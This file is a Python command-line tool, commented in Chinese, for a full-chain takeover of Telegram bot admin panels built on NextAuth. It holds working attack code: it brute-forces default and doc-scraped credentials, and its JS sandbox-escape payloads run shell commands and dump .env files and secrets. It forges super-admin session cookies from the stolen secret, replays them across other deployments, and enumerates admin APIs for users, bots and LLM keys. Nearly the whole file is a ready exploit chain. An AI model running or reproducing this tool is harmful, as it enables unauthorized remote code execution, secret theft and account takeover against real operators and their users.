#!/usr/bin/env python3
"""TG Bot 管理后台 NEXTAUTH + JS 沙箱逃逸全链接管工具。

对齐：传承/飞鸽傀·接管.md
Skill：杀招/太白云生·接管

子命令：
  fingerprint    未登录指纹（文档/登录/session/CSRF）
  doc-creds      扫文档默认凭据并尝试登录（吃 Set-Cookie）
  login          指定账号登录，打印 session cookie
  sandbox-rce    技能沙箱逃逸（路径回退 + 结束后清理）
  forge-session  多变体伪造 session 并验证
  hop            同一 secret 横测多个部署
  admin-enum     枚举 admin API（token 脱敏）
  verify-bot     只读 getMe（不发消息、不改 webhook）
  selftest       无网自检

示例：
  python3 炼蛊房/tg_nextauth_takeover.py fingerprint --base https://tgadmin.example.com --case mycase
  python3 炼蛊房/tg_nextauth_takeover.py doc-creds --base https://tgadmin.example.com --case mycase
  python3 炼蛊房/tg_nextauth_takeover.py login --base https://tgadmin.example.com --case mycase \\
    --email test@gmail.com --password 123456
  python3 炼蛊房/tg_nextauth_takeover.py sandbox-rce --base https://tgadmin.example.com --case mycase \\
    --cookie 'admin_session=xxx'
  python3 炼蛊房/tg_nextauth_takeover.py forge-session --base https://tgadmin.example.com --case mycase \\
    --secret <SECRET> --email admin@example.com
  python3 炼蛊房/tg_nextauth_takeover.py hop --base https://demo.example.com --case mycase \\
    --secret <SECRET> --email admin@example.com --targets https://prod.example.com
  python3 炼蛊房/tg_nextauth_takeover.py admin-enum --base https://tgadmin.example.com --case mycase \\
    --cookie 'admin_session=xxx'
  python3 炼蛊房/tg_nextauth_takeover.py verify-bot --case mycase --token '123456:AA...'
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-tg_nextauth_takeover/1.1"
TIMEOUT = 20.0

SESSION_COOKIE_NAMES = (
    "admin_session",
    "next-auth.session-token",
    "__Secure-next-auth.session-token",
    "authjs.session-token",
    "__Secure-authjs.session-token",
)

LOGIN_PATHS = (
    "/api/auth/login",
    "/api/admin/login",
    "/api/auth/callback/credentials",
)

SKILL_CREATE_PATHS = (
    "/api/admin/skills",
    "/api/skills",
    "/api/v1/admin/skills",
    "/api/bot/skills",
)

SANDBOX_PAYLOADS = {
    "probe": (
        "return this.constructor.constructor('return process')().version"
    ),
    "id": (
        "return this.constructor.constructor('return process')()"
        ".mainModule.require('child_process').execSync('id && hostname').toString()"
    ),
    "env": (
        "return this.constructor.constructor('return process')()"
        ".mainModule.require('child_process').execSync("
        "'(cat /app/.env /app/.env.local /.env 2>/dev/null; "
        "printenv) | grep -E \"SECRET|KEY|TOKEN|PASS|DATABASE|REDIS|ADMIN|BOT\"'"
        ").toString()"
    ),
}

KNOWN_CREDS = [
    ("test@gmail.com", "123456"),
    ("admin@demo.local", "kkajfio!#k"),
    ("admin@yourdomain.com", "jasjwe#k!"),
    ("demo@demo.com", "demo123"),
    ("admin@admin.com", "admin123"),
]

DOC_PATHS = (
    "/docs/system-guide",
    "/docs/admin-guide",
    "/docs/",
    "/docs/setup",
    "/docs/deployment",
    "/docs/getting-started",
    "/readme",
    "/README",
    "/CHANGELOG",
    "/api/docs",
    "/swagger",
)

FINGERPRINT_PATHS = (
    "/",
    "/login",
    "/api/auth/login",
    "/api/auth/session",
    "/api/auth/csrf",
    "/docs/system-guide",
    "/docs/",
)

ADMIN_ENDPOINTS = (
    ("tenants", "/api/admin/tenants"),
    ("users", "/api/admin/users"),
    ("bots", "/api/admin/bots"),
    ("channels", "/api/admin/channels"),
    ("orders", "/api/admin/orders?limit=1"),
    ("keys", "/api/admin/keys"),
    ("llm_keys", "/api/admin/llm-keys"),
    ("skills", "/api/admin/skills"),
)

SECRET_RE = re.compile(
    r"(?:NEXTAUTH_SECRET|AUTH_SECRET|ADMIN_SECRET)\s*[:=]\s*['\"]?([A-Za-z0-9+/=_-]{16,})"
)
EMAIL_PASS_RE = re.compile(
    r"([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,})\s*[/:=]\s*([^\s<\"']{3,64})"
)
REDACT_KEYS = {
    "token", "bottoken", "apikey", "api_key", "secret", "password",
    "password_hash", "key", "access_token", "refresh_token",
}


# ── HTTP ──────────────────────────────────────────────────────────────────────


def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


class _CollectRedirect(urllib.request.HTTPRedirectHandler):
    def __init__(self) -> None:
        self.cookies: list[str] = []

    def _grab(self, headers: Any) -> None:
        getter = getattr(headers, "get_all", None)
        values = getter("Set-Cookie") if getter else [headers.get("Set-Cookie")]
        for item in values or []:
            if item:
                self.cookies.append(item)

    def http_error_302(self, req, fp, code, msg, headers):  # type: ignore[no-untyped-def]
        self._grab(headers)
        return super().http_error_302(req, fp, code, msg, headers)

    http_error_301 = http_error_303 = http_error_307 = http_error_308 = http_error_302


def _ctx(insecure: bool = True) -> ssl.SSLContext:
    if insecure:
        ctx = ssl._create_unverified_context()
        return ctx
    return ssl.create_default_context()


def _http(
    url: str,
    *,
    method: str = "GET",
    data: Any = None,
    cookie: str = "",
    headers: dict[str, str] | None = None,
    insecure: bool = True,
    timeout: float = TIMEOUT,
    form: dict[str, str] | None = None,
) -> dict[str, Any]:
    h = {"User-Agent": UA, "Accept": "application/json, text/html;q=0.8"}
    if cookie:
        h["Cookie"] = cookie
    if headers:
        h.update(headers)
    body: bytes | None = None
    if form is not None:
        body = urllib.parse.urlencode(form).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif data is not None:
        body = json.dumps(data, ensure_ascii=False).encode()
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
    redirect = _CollectRedirect()
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=_ctx(insecure)),
        urllib.request.HTTPHandler(),
        redirect,
    )
    cookies: list[str] = []
    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            code = getattr(resp, "status", 200)
            hdrs = dict(resp.headers.items())
            getter = getattr(resp.headers, "get_all", None)
            extra = getter("Set-Cookie") if getter else ([resp.headers.get("Set-Cookie")] if resp.headers.get("Set-Cookie") else [])
            cookies.extend(x for x in extra if x)
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        code = e.code
        hdrs = dict(e.headers.items()) if e.headers else {}
        getter = getattr(e.headers, "get_all", None) if e.headers else None
        extra = getter("Set-Cookie") if getter else []
        cookies.extend(x for x in (extra or []) if x)
    except Exception as exc:
        return {"status": -1, "body": str(exc), "headers": {}, "cookies": []}
    cookies.extend(redirect.cookies)
    return {"status": code, "body": raw, "headers": hdrs, "cookies": cookies}


# ── 小工具 ────────────────────────────────────────────────────────────────────

def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "tg_nextauth"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _save(case: str, filename: str, obj: Any, *, secret: bool = False) -> Path:
    p = case_dir(case) / filename
    text = obj if isinstance(obj, str) else json.dumps(obj, ensure_ascii=False, indent=2) + "\n"
    p.write_text(text, encoding="utf-8")
    if secret:
        try:
            p.chmod(0o600)
        except OSError:
            pass
    print(f"[write] {p}")
    return p


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def ensure_scope(url: str) -> None:
    host = host_of(url)
    if host in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(host):
        raise SystemExit(f"[scope] refuse out-of-scope host: {host}")


def _cookie_header(raw: str) -> str:
    raw = (raw or "").strip()
    if not raw:
        return ""
    if "=" in raw.split(";", 1)[0]:
        return raw
    return f"admin_session={raw}"


def _cookie_pairs(set_cookie_lines: list[str]) -> list[str]:
    out: list[str] = []
    for line in set_cookie_lines:
        pair = line.split(";", 1)[0].strip()
        if "=" in pair:
            out.append(pair)
    return out


def _pick_session_cookies(set_cookie_lines: list[str]) -> list[str]:
    picked: list[str] = []
    for pair in _cookie_pairs(set_cookie_lines):
        name = pair.split("=", 1)[0].strip()
        if name in SESSION_COOKIE_NAMES:
            picked.append(pair)
    return picked


def _extract_secrets(text: str) -> list[str]:
    return list(dict.fromkeys(SECRET_RE.findall(text or "")))


def _redact(obj: Any) -> Any:
    if isinstance(obj, dict):
        out = {}
        for k, v in obj.items():
            if str(k).lower().replace("-", "") in REDACT_KEYS and isinstance(v, str) and len(v) > 8:
                out[k] = v[:8] + "...[REDACTED]"
            else:
                out[k] = _redact(v)
        return out
    if isinstance(obj, list):
        return [_redact(x) for x in obj]
    return obj


def _unwrap(data: Any) -> Any:
    if isinstance(data, dict):
        for key in ("data", "result", "items", "rows"):
            if key in data:
                return data[key]
    return data


def _login_ok(resp: dict[str, Any], email: str) -> tuple[bool, list[str]]:
    sessions = _pick_session_cookies(resp.get("cookies") or [])
    if sessions:
        return True, sessions
    body = resp.get("body") or ""
    if resp.get("status") not in (200, 201):
        return False, []
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        return (email.lower() in body.lower() and "error" not in body.lower()), []
    if not isinstance(parsed, dict):
        return False, []
    user = parsed.get("user") if isinstance(parsed.get("user"), dict) else {}
    ok = bool(
        parsed.get("token")
        or parsed.get("access_token")
        or parsed.get("session")
        or parsed.get("ok") is True
        or user.get("email")
    )
    return ok, []


def _try_login(base: str, email: str, password: str, *, insecure: bool) -> dict[str, Any]:
    bodies: list[Any] = [
        {"email": email, "password": password},
        {"username": email, "password": password},
        {"account": email, "password": password},
    ]
    # CSRF + credentials callback（标准 NextAuth）
    csrf = _http(base + "/api/auth/csrf", insecure=insecure)
    csrf_token = ""
    try:
        csrf_token = json.loads(csrf.get("body") or "{}").get("csrfToken") or ""
    except json.JSONDecodeError:
        csrf_token = ""
    last = {"status": -1, "body": "", "cookies": [], "path": "", "ok": False, "sessions": []}
    for path in LOGIN_PATHS:
        if path.endswith("/callback/credentials"):
            if not csrf_token:
                continue
            resp = _http(
                base + path,
                method="POST",
                form={
                    "csrfToken": csrf_token,
                    "email": email,
                    "password": password,
                    "callbackUrl": base,
                    "json": "true",
                },
                insecure=insecure,
            )
            ok, sessions = _login_ok(resp, email)
            last = {**resp, "path": path, "ok": ok, "sessions": sessions}
            if ok:
                return last
            continue
        for payload in bodies:
            resp = _http(base + path, method="POST", data=payload, insecure=insecure)
            ok, sessions = _login_ok(resp, email)
            last = {**resp, "path": path, "ok": ok, "sessions": sessions, "payload_keys": list(payload)}
            if ok:
                return last
    return last


def _forge_variants(secret: str, email: str, role: str) -> list[tuple[str, str]]:
    """返回 (变体名, cookie_header)。"""
    payload = {
        "user": {"id": "1", "email": email, "role": role},
        "expires": "2027-12-31T23:59:59.000Z",
    }
    compact = json.dumps(payload, separators=(",", ":"), ensure_ascii=False)
    pretty = json.dumps(payload, ensure_ascii=False)
    variants: list[tuple[str, str]] = []

    def two_part(name: str, message: bytes) -> None:
        p = _b64url(compact.encode())
        sig = _b64url(hmac.new(secret.encode(), message, hashlib.sha256).digest())
        variants.append((name, f"admin_session={p}.{sig}"))

    two_part("hmac_b64_payload", _b64url(compact.encode()).encode())
    two_part("hmac_raw_compact", compact.encode())
    two_part("hmac_raw_pretty", pretty.encode())

    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    jwt_payloads = [
        ("jwt_custom", compact),
        (
            "jwt_nextauth",
            json.dumps(
                {"email": email, "sub": "1", "role": role, "name": email, "iat": 1700000000, "exp": 1893456000},
                separators=(",", ":"),
            ),
        ),
    ]
    for name, raw in jwt_payloads:
        p = _b64url(raw.encode())
        msg = f"{header}.{p}".encode()
        sig = _b64url(hmac.new(secret.encode(), msg, hashlib.sha256).digest())
        token = f"{header}.{p}.{sig}"
        variants.append((f"{name}_admin_session", f"admin_session={token}"))
        variants.append((f"{name}_nextauth", f"next-auth.session-token={token}"))
    return variants


def _skill_bodies(name: str, script: str) -> list[dict[str, Any]]:
    return [
        {"name": name, "executionMode": "sandbox", "script": script},
        {"name": name, "executionMode": "sandbox", "code": script},
        {"name": name, "mode": "sandbox", "script": script},
        {"title": name, "executionMode": "sandbox", "content": script},
    ]


def _parse_skill_id(body: str) -> str | None:
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        return None
    if not isinstance(parsed, dict):
        return None
    for cand in (
        parsed.get("id"),
        parsed.get("_id"),
        (parsed.get("data") or {}).get("id") if isinstance(parsed.get("data"), dict) else None,
        (parsed.get("result") or {}).get("id") if isinstance(parsed.get("result"), dict) else None,
    ):
        if cand not in (None, "", 0, False):
            return str(cand)
    return None


# ── 子命令 ────────────────────────────────────────────────────────────────────

def cmd_fingerprint(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    rows = []
    hits: list[str] = []
    print(f"[*] fingerprint {base}")
    for path in FINGERPRINT_PATHS:
        resp = _http(base + path, insecure=args.insecure)
        body = resp["body"]
        marks = []
        low = body[:8000].lower()
        for k in ("kyber", "tg bot", "next-auth", "nextauth", "admin_session", "executionmode", "sandbox"):
            if k in low:
                marks.append(k)
                hits.append(k)
        rows.append({"path": path, "status": resp["status"], "len": len(body), "marks": marks})
        flag = "HIT" if marks or resp["status"] == 200 else str(resp["status"])
        print(f"  [{flag}] {path} → {resp['status']} len={len(body)} {marks}")
    report = {"checked_at": _now(), "base": base, "hits": sorted(set(hits)), "rows": rows}
    _save(args.case, "fingerprint.json", report)
    print(f"[verdict] marks={sorted(set(hits)) or 'none'}")
    return 0


def cmd_doc_creds(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    doc_rows = []
    found: list[tuple[str, str]] = []
    print(f"[*] scan docs ({len(DOC_PATHS)})")
    for path in DOC_PATHS:
        resp = _http(base + path, insecure=args.insecure)
        creds = EMAIL_PASS_RE.findall(resp["body"] or "") if resp["status"] == 200 else []
        # 丢掉明显不是口令的尾巴
        creds = [(e, p.rstrip(".,;")) for e, p in creds if "http" not in p.lower()]
        doc_rows.append({"path": path, "status": resp["status"], "len": len(resp["body"] or ""), "creds": creds})
        if resp["status"] == 200:
            print(f"  [+] {path} len={len(resp['body'] or '')} creds={creds or '-'}")
            found.extend(creds)
        else:
            print(f"  [-] {resp['status']} {path}")

    tried = list(dict.fromkeys(found + KNOWN_CREDS))
    print(f"[*] login {len(tried)} creds")
    valid = []
    for email, password in tried:
        result = _try_login(base, email, password, insecure=args.insecure)
        mark = "L1_OK" if result.get("ok") else f"HTTP{result.get('status')}"
        print(f"  [{mark}] {email} via {result.get('path')}")
        if result.get("ok"):
            valid.append({
                "email": email,
                "password": password,
                "path": result.get("path"),
                "sessions": result.get("sessions") or [],
                "status": result.get("status"),
            })

    report = {
        "checked_at": _now(),
        "base": base,
        "doc_rows": doc_rows,
        "valid_creds": valid,
        "l1_doc_or_default_login": bool(valid),
    }
    _save(args.case, "doc_creds_scan.json", report, secret=True)
    if valid:
        sess = valid[0].get("sessions") or []
        print("[verdict] L1_OK 有身份 → 填 案卷/object_matrix.md ；下一步 sandbox-rce")
        if sess:
            print(f"  export ADMIN_COOKIE='{sess[0]}'")
        return 0
    print("[verdict] 默认凭据未命中；改 login --email/--password 或换出口")
    return 1


def cmd_login(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    result = _try_login(base, args.email, args.password, insecure=args.insecure)
    report = {
        "checked_at": _now(),
        "base": base,
        "email": args.email,
        "ok": bool(result.get("ok")),
        "path": result.get("path"),
        "status": result.get("status"),
        "sessions": result.get("sessions") or [],
        "body_preview": (result.get("body") or "")[:400],
    }
    _save(args.case, "login.json", report, secret=True)
    if report["ok"]:
        print(f"[L1_OK] {args.email} via {report['path']}")
        for s in report["sessions"]:
            print(f"  export ADMIN_COOKIE='{s}'")
        print("[next] 填 案卷/object_matrix.md 后跑 sandbox-rce")
        return 0
    print(f"[fail] login {report['status']} {report['body_preview']}")
    return 1


def cmd_sandbox_rce(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    cookie = _cookie_header(args.cookie)
    stages = ["probe", "id", "env"] if args.stage == "all" else [args.stage]
    created: list[tuple[str, str]] = []  # path, id
    outputs: dict[str, Any] = {}
    secrets: list[str] = []

    def _cleanup() -> None:
        if args.no_cleanup or not created:
            return
        print(f"[*] cleanup {len(created)} skills")
        for path, sid in created:
            resp = _http(f"{base}{path}/{sid}", method="DELETE", cookie=cookie, insecure=args.insecure)
            print(f"  [{'ok' if resp['status'] in (200, 204) else resp['status']}] DELETE {path}/{sid}")

    try:
        for stage in stages:
            script = SANDBOX_PAYLOADS[stage]
            print(f"[*] stage {stage}")
            skill_name = f"_probe_{stage}_{int(time.time())}"
            created_id = None
            used_path = ""
            create_body = ""
            for path in SKILL_CREATE_PATHS:
                for payload in _skill_bodies(skill_name, script):
                    resp = _http(base + path, method="POST", data=payload, cookie=cookie, insecure=args.insecure)
                    sid = _parse_skill_id(resp["body"]) if resp["status"] in (200, 201) else None
                    if sid:
                        created_id, used_path, create_body = sid, path, resp["body"]
                        break
                    create_body = resp["body"]
                if created_id:
                    break
            if not created_id:
                print(f"  [fail] create skill: {(create_body or '')[:220]}")
                outputs[stage] = {"error": "create_failed", "body": (create_body or "")[:500]}
                continue
            created.append((used_path, created_id))
            print(f"  [+] created {used_path} id={created_id}")
            exec_body = ""
            exec_code = -1
            for suffix in ("/execute", "/run"):
                resp = _http(
                    f"{base}{used_path}/{created_id}{suffix}",
                    method="POST",
                    data={},
                    cookie=cookie,
                    insecure=args.insecure,
                )
                exec_code, exec_body = resp["status"], resp["body"]
                if resp["status"] in (200, 201):
                    break
            print(f"  [exec {exec_code}] {exec_body[:280]}")
            outputs[stage] = {"create": used_path, "id": created_id, "exec_status": exec_code, "body": exec_body}
            secrets.extend(_extract_secrets(exec_body))
            secrets.extend(_extract_secrets(create_body))
    finally:
        _cleanup()

    secrets = list(dict.fromkeys(secrets))
    report = {
        "checked_at": _now(),
        "base": base,
        "outputs": outputs,
        "secrets_found": [s[:8] + "...[REDACTED]" for s in secrets],
        "cleanup": (not args.no_cleanup),
        "l2_rce": any("uid=" in json.dumps(v) for v in outputs.values()),
    }
    _save(args.case, "sandbox_rce_output.json", report, secret=True)
    if secrets:
        _save(args.case, "extracted_secrets.txt", "\n".join(secrets) + "\n", secret=True)
        print(f"[!] extracted {len(secrets)} secret(s) → extracted_secrets.txt (600)")
        print("[next] forge-session --secret <NEXTAUTH_SECRET>")
    else:
        print("[next] 若 RCE 成功但没抽到 secret，手工从 outputs 里找 NEXTAUTH_SECRET")
    return 0 if outputs else 1


def cmd_forge_session(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    hits = []
    print(f"[*] forge {len(_forge_variants(args.secret, args.email, args.role))} variants")
    for name, cookie in _forge_variants(args.secret, args.email, args.role):
        resp = _http(base + "/api/auth/session", cookie=cookie, insecure=args.insecure)
        body = resp["body"] or ""
        ok = resp["status"] == 200 and (
            args.email.lower() in body.lower()
            or args.role.lower() in body.lower()
            or '"user"' in body.lower()
        )
        mark = "L3_OK" if ok else str(resp["status"])
        print(f"  [{mark}] {name} → {resp['status']} {body[:120].replace(chr(10), ' ')}")
        if ok:
            hits.append({"variant": name, "cookie": cookie, "body": body[:800]})
            break
    report = {
        "checked_at": _now(),
        "base": base,
        "email": args.email,
        "role": args.role,
        "success": bool(hits),
        "hit": hits[0] if hits else None,
        "secret_fp": args.secret[:8] + "...",
    }
    _save(args.case, "session_forged_test.json", report, secret=True)
    if hits:
        print(f"[verdict] L3_OK variant={hits[0]['variant']}")
        print(f"  export ADMIN_COOKIE='{hits[0]['cookie']}'")
        print("[next] hop --targets 同产品其它部署 ；admin-enum")
        return 0
    print("[verdict] 全部变体未命中：secret 可能用于 JWE，或 cookie 名/payload 字段不同")
    return 1


def cmd_hop(args: argparse.Namespace) -> int:
    bases = [args.base.rstrip("/")]
    if args.targets:
        bases.extend(x.strip().rstrip("/") for x in args.targets.split(",") if x.strip())
    bases = list(dict.fromkeys(bases))
    for b in bases:
        ensure_scope(b)
    variants = _forge_variants(args.secret, args.email, args.role)
    rows = []
    print(f"[*] hop {len(bases)} hosts × {len(variants)} variants")
    for base in bases:
        hit = None
        for name, cookie in variants:
            resp = _http(base + "/api/auth/session", cookie=cookie, insecure=args.insecure)
            body = resp["body"] or ""
            ok = resp["status"] == 200 and (
                args.email.lower() in body.lower()
                or '"user"' in body.lower()
            )
            if ok:
                hit = {"variant": name, "cookie": cookie, "body": body[:400]}
                print(f"  [L3_OK] {base} via {name}")
                break
        if not hit:
            print(f"  [miss] {base}")
        rows.append({"base": base, "ok": bool(hit), "hit": hit})
    report = {"checked_at": _now(), "rows": rows, "any": any(r["ok"] for r in rows)}
    _save(args.case, "hop.json", report, secret=True)
    return 0 if report["any"] else 1


def cmd_admin_enum(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    base = args.base.rstrip("/")
    cookie = _cookie_header(args.cookie)
    results: dict[str, Any] = {}
    print(f"[*] admin-enum {base}")
    for name, path in ADMIN_ENDPOINTS:
        resp = _http(base + path, cookie=cookie, insecure=args.insecure)
        parsed: Any
        try:
            parsed = json.loads(resp["body"]) if resp["status"] == 200 else {"status": resp["status"], "body": (resp["body"] or "")[:300]}
        except json.JSONDecodeError:
            parsed = (resp["body"] or "")[:500]
        inner = _unwrap(parsed)
        n = len(inner) if isinstance(inner, list) else None
        print(f"  [{'ok' if resp['status'] == 200 else resp['status']}] {name} {path}" + (f" → {n}" if n is not None else ""))
        results[name] = {"status": resp["status"], "data": _redact(parsed)}
    report = {"checked_at": _now(), "base": base, "results": results}
    _save(args.case, "admin_api_enum.json", report, secret=True)
    ok_n = sum(1 for v in results.values() if v.get("status") == 200)
    print(f"[verdict] {ok_n}/{len(ADMIN_ENDPOINTS)} endpoints 200")
    return 0 if ok_n else 1


def cmd_verify_bot(args: argparse.Namespace) -> int:
    token = args.token.strip()
    if ":" not in token:
        raise SystemExit("[fail] bot token 格式应为 <id>:<secret>")
    url = f"https://api.telegram.org/bot{token}/getMe"
    resp = _http(url, insecure=args.insecure)
    try:
        parsed = json.loads(resp["body"] or "{}")
    except json.JSONDecodeError:
        parsed = {"_raw": (resp["body"] or "")[:400]}
    result = parsed.get("result") if isinstance(parsed, dict) else {}
    report = {
        "checked_at": _now(),
        "ok": bool(isinstance(parsed, dict) and parsed.get("ok")),
        "username": (result or {}).get("username"),
        "can_read_all_group_messages": (result or {}).get("can_read_all_group_messages"),
        "note": "只读 getMe；发消息/改 webhook 先问，走 tg-bot-webhook-hijack --confirm",
    }
    _save(args.case, "verify_bot.json", report)
    print(json.dumps(report, ensure_ascii=False, indent=2))
    return 0 if report["ok"] else 1


def cmd_selftest(_args: argparse.Namespace) -> int:
    assert _b64url(b"ab+") == "YWIr"
    assert _cookie_header("abc") == "admin_session=abc"
    assert _cookie_header("admin_session=abc") == "admin_session=abc"
    picked = _pick_session_cookies(["admin_session=xyz; Path=/", "foo=bar"])
    assert picked == ["admin_session=xyz"], picked
    secs = _extract_secrets('NEXTAUTH_SECRET=aabbccddeeff0011\nAUTH_SECRET="1122334455667788"')
    assert len(secs) == 2, secs
    variants = _forge_variants("s" * 32, "admin@example.com", "super-admin")
    assert len(variants) >= 5
    assert all("=" in c and "." in c for _, c in variants)
    red = _redact({"token": "1234567890abcd", "n": 1})
    assert red["token"].endswith("[REDACTED]") and red["n"] == 1
    print("selftest ok")
    return 0


def _add_common(p: argparse.ArgumentParser, *, need_base: bool = True) -> None:
    if need_base:
        p.add_argument("--base", required=True, help="https://tgadmin.example.com")
    p.add_argument("--case", required=True, help="案卷名")
    p.add_argument("--insecure", action="store_true", help="跳过 TLS 校验（默认已跳过）")


def main() -> int:
    ap = argparse.ArgumentParser(description="TG Bot NEXTAUTH + 沙箱逃逸全链接管")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("fingerprint", help="未登录指纹")
    _add_common(p)
    p.set_defaults(func=cmd_fingerprint)

    p = sub.add_parser("doc-creds", help="扫文档默认凭据并登录")
    _add_common(p)
    p.set_defaults(func=cmd_doc_creds)

    p = sub.add_parser("login", help="指定账号登录")
    _add_common(p)
    p.add_argument("--email", required=True)
    p.add_argument("--password", required=True)
    p.set_defaults(func=cmd_login)

    p = sub.add_parser("sandbox-rce", help="JS vm 沙箱逃逸（默认清理）")
    _add_common(p)
    p.add_argument("--cookie", required=True, help="admin_session=... 或裸值")
    p.add_argument("--stage", default="all", choices=("probe", "id", "env", "all"))
    p.add_argument("--no-cleanup", action="store_true")
    p.set_defaults(func=cmd_sandbox_rce)

    p = sub.add_parser("forge-session", help="多变体伪造 session")
    _add_common(p)
    p.add_argument("--secret", required=True)
    p.add_argument("--email", required=True)
    p.add_argument("--role", default="super-admin")
    p.set_defaults(func=cmd_forge_session)

    p = sub.add_parser("hop", help="同一 secret 横测多个部署")
    _add_common(p)
    p.add_argument("--secret", required=True)
    p.add_argument("--email", required=True)
    p.add_argument("--role", default="super-admin")
    p.add_argument("--targets", default="", help="逗号分隔的其它 https 部署")
    p.set_defaults(func=cmd_hop)

    p = sub.add_parser("admin-enum", help="枚举 admin API")
    _add_common(p)
    p.add_argument("--cookie", required=True)
    p.set_defaults(func=cmd_admin_enum)

    p = sub.add_parser("verify-bot", help="只读 getMe")
    p.add_argument("--case", required=True)
    p.add_argument("--token", required=True)
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_verify_bot)

    p = sub.add_parser("selftest", help="无网自检")
    p.set_defaults(func=cmd_selftest)

    args = ap.parse_args()
    if not hasattr(args, "insecure"):
        args.insecure = True
    else:
        # 本工具默认不校验证书；--insecure 保留兼容，始终跳过
        args.insecure = True
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
